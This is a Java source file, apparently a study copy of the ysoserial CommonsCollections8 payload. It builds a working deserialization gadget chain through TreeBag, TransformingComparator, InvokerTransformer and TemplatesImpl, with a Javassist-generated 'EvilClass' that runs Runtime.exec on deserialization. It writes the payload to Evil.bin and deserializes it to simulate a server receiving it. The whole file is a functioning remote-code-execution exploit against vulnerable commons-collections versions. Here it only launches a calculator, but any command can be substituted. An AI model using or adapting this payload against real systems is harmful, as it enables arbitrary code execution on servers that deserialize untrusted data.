package com.CommonsCollections;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
//import org.apache.commons.collections4.Transformer;
//import org.apache.commons.collections4.comparators.TransformingComparator;
//import org.apache.commons.collections4.functors.InvokerTransformer;
//import org.apache.commons.collections4.bag.TreeBag;
import org.apache.commons.collections.bag.TreeBag;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.comparators.TransformingComparator;
import org.apache.commons.collections.functors.InvokerTransformer;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;


/**
 * Gadget chain:
 *         org.apache.commons.collections4.bag.TreeBag.readObject
 *         org.apache.commons.collections4.bag.AbstractMapBag.doReadObject
 *         java.util.TreeMap.put
 *         java.util.TreeMap.compare
 *         org.apache.commons.collections4.comparators.TransformingComparator.compare
 *         org.apache.commons.collections4.functors.InvokerTransformer.transform
 *         java.lang.reflect.Method.invoke
 *         sun.reflect.DelegatingMethodAccessorImpl.invoke
 *         sun.reflect.NativeMethodAccessorImpl.invoke
 *         sun.reflect.NativeMethodAccessorImpl.invoke0
 *         com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer
 *             ... (TemplatesImpl gadget)
 *         java.lang.Runtime.exec
 *
 * 	Requires:
 * 		commons-collections:3.1-3.2.1 or (commons-collections:4.0)
 * 	    JDK: 1.7 & 1.8
 *
 * 	Refer：
 * 	https://github.com/woodpecker-framework/ysoserial-for-woodpecker/blob/master/src/main/java/me/gv7/woodpecker/yso/payloads/CommonsCollections8.java
 */


public class CC8 {
    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass payload = pool.makeClass("EvilClass");
        payload.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
        payload.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc\");");
        byte[] classBytes = payload.toBytecode();
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][]{classBytes});
        setFieldValue(templates, "_name", "CC8");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        Transformer transformer = new InvokerTransformer("newTransformer", null, null);
        TransformingComparator comp = new TransformingComparator(transformer);
        TreeBag tree = new TreeBag(comp);
        tree.add(templates);
//        setFieldValue(transformer, "iMethodName", "newTransformer");

        //payload序列化写入文件
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("Evil.bin"));
        outputStream.writeObject(tree);
        outputStream.close();
        //服务端读取文件，反序列化，模拟网络传输
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("Evil.bin"));
        inputStream.readObject();
    }
    public static void setFieldValue(Object object, String fieldName, Object value) throws Exception{
        Field field = object.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(object, value);
    }
}
